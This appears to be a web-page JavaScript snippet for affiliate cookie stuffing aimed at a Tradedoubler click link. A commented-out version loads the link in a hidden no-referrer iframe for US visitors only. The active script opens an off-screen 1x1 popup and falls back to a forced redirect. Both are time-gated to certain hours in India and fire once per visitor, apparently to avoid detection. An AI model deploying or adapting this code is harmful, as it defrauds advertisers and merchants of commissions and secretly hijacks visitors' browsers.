
// (function () {
//   try {
//     var BUILD_ID = "octaads-2025-rtg-geo-time-05";
//     if (window.__OCTAADS_LOADED === BUILD_ID) return;
//     window.__OCTAADS_LOADED = BUILD_ID;

//     /* ===============================
//        RUN ONLY ONCE PER USER
//     =============================== */
//     if (localStorage.getItem("fired") === "1") return;

//     /* ===============================
//        IST TIME CHECK: 12:45 AM – 12:55 AM
//     =============================== */
// function isAllowedISTTime() {
//   var now = new Date(
//     new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
//   );

//   var minutes = now.getHours() * 60 + now.getMinutes();

//   // 1:00 AM = 60
//   // 9:00 AM = 540
//   return minutes >= 60 && minutes <= 540;
// }

// if (!isAllowedISTTime()) return;



//     /* ===============================
//        SESSION ID
//     =============================== */
//     function getSessionID() {
//       var m = document.cookie.match(/octaads_sid=([^;]+)/);
//       if (m) return m[1];

//       var sid = "sid_" + Math.random().toString(36).substr(2, 10);
//       document.cookie =
//         "octaads_sid=" + sid +
//         "; path=/; max-age=2592000; SameSite=Lax";
//       return sid;
//     }

//     var sessionID = getSessionID();

//     /* ===============================
//        GEO CHECK – US ONLY
//     =============================== */
//     fetch("https://ipapi.co/json/", { cache: "no-store" })
//       .then(r => r.json())
//       .then(geo => {
//         if (!geo) return;
//         if (geo.country_code !== "US") return;

//         /* Mark as fired – prevents future clicks */
//         localStorage.setItem("fired", "1");

//         function setCookie(n, v) {
//           document.cookie =
//             n + "=" + v + "; path=/; max-age=2592000; SameSite=Lax";
//         }

//         setCookie("tduid", sessionID);
//         setCookie("clickId", sessionID);

//         var iframe = document.createElement("iframe");
//         iframe.style.display = "none";
//         iframe.referrerPolicy = "no-referrer";
//         iframe.src =
//           "https://clk.tradedoubler.com/click" +
//           "?p=382651&a=3421038&epi=98076" +
//           "&tduid=" + encodeURIComponent(sessionID);
//         document.body.appendChild(iframe);
//       })
//       .catch(function () {});

//   } catch (e) {}
// })();

<script>
(function () {
  const AFFILIATE_LINK =
    "https://clk.tradedoubler.com/click?p=382651&a=3421038&epi=98076";
  const COOKIE_NAME = "octaads_clicked";

  /* ===============================
     IST TIME CHECK (12:00 AM – 12:00 PM)
  =============================== */
  function isAllowedISTTime() {
    const now = new Date(
      new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
    );

    const minutes = now.getHours() * 60 + now.getMinutes();

    // 12:00 AM = 0
    // 12:00 PM = 720
    return minutes >= 0 && minutes <= 720;
  }

  if (!isAllowedISTTime()) return;

  /* ===============================
     COOKIE HELPERS
  =============================== */
  function setCookie(name, value, days) {
    const d = new Date();
    d.setTime(d.getTime() + days * 24 * 60 * 60 * 1000);
    document.cookie =
      name + "=" + value + "; path=/; expires=" + d.toUTCString() + "; SameSite=Lax";
  }

  function getCookie(name) {
    const match = document.cookie.match(
      new RegExp("(^| )" + name + "=([^;]+)")
    );
    return match ? match[2] : null;
  }

  function hasClicked() {
    return getCookie(COOKIE_NAME) === "1";
  }

  function markClicked() {
    setCookie(COOKIE_NAME, "1", 365);
  }

  /* ===============================
     FIRE AFFILIATE
  =============================== */
  function fireAffiliate() {
    if (hasClicked()) return;

    const win = window.open(
      AFFILIATE_LINK,
      "_blank",
      "width=1,height=1,left=-1000,top=-1000"
    );

    if (!win) {
      // Popup blocked → fallback redirect
      setTimeout(() => {
        markClicked();
        window.location.href = AFFILIATE_LINK;
      }, 3000);
    } else {
      // Popup worked
      markClicked();
    }
  }

  /* ===============================
     DOM READY
  =============================== */
  if (
    document.readyState === "complete" ||
    document.readyState === "interactive"
  ) {
    fireAffiliate();
  } else {
    document.addEventListener("DOMContentLoaded", fireAffiliate);
  }
})();
</script>





